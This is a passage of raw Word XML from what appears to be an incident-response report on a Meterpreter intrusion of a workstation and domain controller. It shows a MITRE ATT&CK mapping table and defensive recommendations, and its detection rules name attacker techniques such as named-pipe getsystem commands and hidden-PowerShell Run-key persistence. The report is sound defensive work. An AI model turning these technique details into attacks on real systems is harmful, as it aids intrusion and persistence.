              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-025</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1027</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010, F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1036.005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-008, F-027, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1039</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-025</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1041</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-014, F-031, T-025</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1046</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-018, T-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1055</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010, T-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1055.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-015, T-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1059.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010, F-016, F-019, T-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1059.003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-012, T-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1070</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-030</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1070.004</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-013, F-026, T-013, T-021</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1071</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-011, T-007, T-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1071.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-008, F-014, F-015, F-016, F-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1074.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-031</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1078.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-006, F-021, F-023</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1083</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-026, T-022</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1095</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-017, T-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1098</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-022, T-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1105</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-008, F-011, F-017, F-027, F-029, T-006, T-015, T-026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1110</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1110.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-018, T-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1112</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010, F-019, T-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1133</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1134</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1134.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-009, T-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1204.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-008, F-012, F-029, T-023, T-026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1543.003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-008, F-009, F-012, F-020, F-027, T-008, T-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1547.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010, F-016, F-019, F-023, T-010, T-017, T-028</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1553.005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-029, T-023</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1560.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-013, F-026, F-031, T-013, T-021</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1562.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-007, F-027, F-030, T-005, T-024</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1569.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-009, F-012, F-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1573</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1620</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010, F-015, F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Answers to the questions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(no question asked)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Immediate actions (containment)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Isolate DESKTOP-SDN1RPT (10.42.85.115) and DC CITADEL-DC01 (10.42.85.10) from the network; a live Meterpreter session (spoolsv.exe PID 2188, powershell.exe PID 3316) to 203.78.103.109:443 was still active at acquisition.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Block 194.61.24.102 and 203.78.103.109 (all ports) at perimeter firewall/proxy and hunt for any other internal host contacting them.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Treat C137.local as fully compromised: reset C137\Administrator (-500), ricksanchez and all Domain/Enterprise Admin passwords; reset krbtgt twice (with replication interval between); invalidate sessions/tickets.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Close external RDP exposure of the DC (internet-facing 3389 brute-forced from 194.61.24.102).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Notify privacy/legal: PII of mortysmith (Social Security Number file) was staged and probably exfiltrated.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Eradication and recovery</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run value 'coreupdate' and key HKLM\Software\q9Z1bssi (value JqxNhWJA).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Stop/delete service 'coreupdater' and remove C:\Windows\System32\coreupdater.exe (SHA256 10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6); verify 'nehgye' service is absent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Preferably rebuild the workstation and the DC from known-good media rather than cleaning (SYSTEM + Domain Admin implant, possible credential dumping via lsass handle).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Re-enable Defender real-time protection, MAPS, sample submission and Tamper Protection; run full offline scan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Remove unnecessary accounts/groups (Domain Admins, Domain Users, Administrator) from the workstation's Remote Desktop Users group.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Hardening</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Never expose RDP to the internet; require VPN/RD Gateway with MFA; enable account lockout and NLA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rename/disable built-in domain Administrator for interactive use; tiered admin model; forbid Domain Admin interactive logon on workstations (deny logon policies, Protected Users, LAPS for local admin).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Enable Defender Tamper Protection centrally (Intune/MDE) so local disable via SecHealthUI is impossible; enable ASR rules and SmartScreen block (not warn) for unrecognized apps.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Enable LSA protection (RunAsPPL) and Credential Guard.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Application control (WDAC/AppLocker) preventing unsigned executables in System32 / user Downloads.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Egress filtering: block direct outbound 443 from workstations/servers except via proxy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Detection and monitoring</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Deploy Sysmon (EID 1/3/8/10/11/13) and enable 4688 with command line, PowerShell ScriptBlock (4104) and Module logging across the estate.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Alert on Defender 5001/5007 changes to DisableRealtimeMonitoring / SpyNetReporting / SubmitSamplesConsent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Alert on 7045 services with random 6-char lowercase names or cmd.exe /c echo ... &gt; \\.\pipe\ (Meterpreter getsystem).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Alert on Run-key values launching 'powershell -nop -w hidden' and on PowerShell reading base64 from HKLM\Software\&lt;random&gt; (Metasploit registry_persistence).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sigma/EDR: spoolsv.exe with outbound non-print network connections or opening lsass.exe handles.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Network IDS: keep ET 'PE over raw TCP' / Metasploit Bind_API and RDP brute-force signatures enabled; alert on multiple 4625/RDP cookie attempts against admin accounts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Alert on 4624 type 10 by Domain Admins to workstations and on RDP chains originating from DCs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Further investigation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Full forensic collection (disk + memory + Security/RDP logs) of DC CITADEL-DC01: initial brute-force success (4625/4624 from 194.61.24.102), coreupdater execution at ~03:24, persistence, NTDS.dit access/DCSync, GPO changes, new accounts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Complete memory analysis of the existing image: dump spoolsv.exe PID 2188 and powershell PID 3316 regions, extract Meterpreter config/transport, check for mimikatz/kiwi artifacts and lsass reads.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
